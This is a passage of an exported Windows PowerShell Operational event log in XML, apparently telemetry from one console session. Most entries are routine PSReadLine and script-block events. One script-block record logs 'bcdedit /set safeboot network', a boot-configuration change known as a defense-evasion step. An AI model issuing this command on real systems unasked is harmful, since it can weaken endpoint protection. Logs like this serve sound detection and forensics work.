<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">c8199b0e-8e13-48a0-a750-74ece90e7aa0</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:51.999235"></TimeCreated>
<EventRecordID>3783</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5e5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:37:52.000072"></TimeCreated>
<EventRecordID>3784</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5f5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 60
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadLine\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 224
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.398079"></TimeCreated>
<EventRecordID>3785</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5f5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.399397"></TimeCreated>
<EventRecordID>3786</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-5e5e-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 60
        Command Name = PSConsoleHostReadLine
        Command Type = Function
        Script Name = 
        Command Path = 
        Sequence Number = 226
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.402079"></TimeCreated>
<EventRecordID>3787</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0003-75d9-30d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">bcdedit /set safeboot network</Data>
<Data Name="ScriptBlockId">4424e2da-5302-4ba7-9280-a7b70b33e0aa</Data>
<Data Name="Path"></Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.402082"></TimeCreated>
<EventRecordID>3788</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0003-75d9-30d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">4424e2da-5302-4ba7-9280-a7b70b33e0aa</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.469456"></TimeCreated>
<EventRecordID>3789</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0003-76d9-30d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">4424e2da-5302-4ba7-9280-a7b70b33e0aa</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.470324"></TimeCreated>
<EventRecordID>3790</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0003-75d9-30d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 61
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 228
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.471016"></TimeCreated>
<EventRecordID>3791</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-a012-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="10116"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">34aecddc-0c86-4d33-ac3f-ea406960ccef</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.471107"></TimeCreated>
<EventRecordID>3792</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-a012-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="10116"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">34aecddc-0c86-4d33-ac3f-ea406960ccef</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.473059"></TimeCreated>
<EventRecordID>3793</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-355a-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">prompt</Data>
<Data Name="ScriptBlockId">606a5749-dab9-46a3-bfde-fab225a7f24f</Data>
<Data Name="Path"></Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.473070"></TimeCreated>
<EventRecordID>3794</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-355a-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">606a5749-dab9-46a3-bfde-fab225a7f24f</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.473202"></TimeCreated>
<EventRecordID>3795</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-365a-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.473358"></TimeCreated>
<EventRecordID>3796</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-365a-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">1a8b102e-758f-405f-af6e-5b82d08a2a07</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.473381"></TimeCreated>
<EventRecordID>3797</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0001-365a-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">606a5749-dab9-46a3-bfde-fab225a7f24f</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4105</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>102</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.475821"></TimeCreated>
<EventRecordID>3798</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-0c60-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:35.476948"></TimeCreated>
<EventRecordID>3799</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-0d60-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.26100.3624
        Host ID = 06070939-645a-4cb4-bb35-feff3e76ad09
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.26100.3624
        Runspace ID = 62516b95-d457-41c9-aa13-31b963bcf8bb
        Pipeline ID = 63
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadLine\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 230
        User = DESKTOP-M3AKJSD\User
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4106</EventID>
<Version>1</Version>
<Level>5</Level>
<Task>103</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2025-04-10 06:38:43.545130"></TimeCreated>
<EventRecordID>3800</EventRecordID>
<Correlation ActivityID="{d72fe4f3-a9dd-0000-0d60-31d7dda9db01}" RelatedActivityID=""></Correlation>
<Execution ProcessID="9808" ThreadID="4644"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>DESKTOP-M3AKJSD</Computer>
<Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002"></Security>
</System>
<EventData><Data Name="ScriptBlockId">8a832e35-24e1-4fa8-a129-0098e18f7f1d</Data>
<Data Name="RunspaceId">62516b95-d457-41c9-aa13-31b963bcf8bb</Data>
</EventData>
</Event>

